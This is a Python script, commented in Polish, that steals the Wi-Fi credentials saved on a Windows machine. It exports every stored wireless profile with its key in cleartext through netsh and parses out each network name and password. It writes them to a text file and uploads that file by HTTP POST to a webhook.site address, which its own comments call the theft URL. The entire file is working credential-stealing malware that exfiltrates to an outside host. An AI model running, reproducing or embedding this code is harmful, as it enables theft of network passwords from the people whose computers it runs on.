import subprocess
import os
import sys
import requests

#url kradzieja - zmień jak będziesz miał znowu otwarte
url = 'https://webhook.site/b9c579c2-3360-4df0-87ed-e8aa2a474144'

#Utwórz plik
password_file = open('passwords.txt', "w")
password_file.write("Dzień dobry, pacz na te hasła: \n\n")
password_file.close()

#Listy
wifi_files = []
wifi_name = []
wifi_passwd = []

#wykonaj komendę windowsową
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()

#Pokaż swój folder
path = os.getcwd()

#Do the hacky wacky
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, 'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_passwd.append(back)
                        for x, y in zip(wifi_name, wifi_passwd):
                            sys.stdout = open("passwords.txt", "a")
                            print("SSID: "+x, "Password: "+y, sep='\n')
                            sys.stdout.close()

#Kradziejowany upload
with open('passwords.txt', 'rb') as f:
    r = requests.post(url, data=f)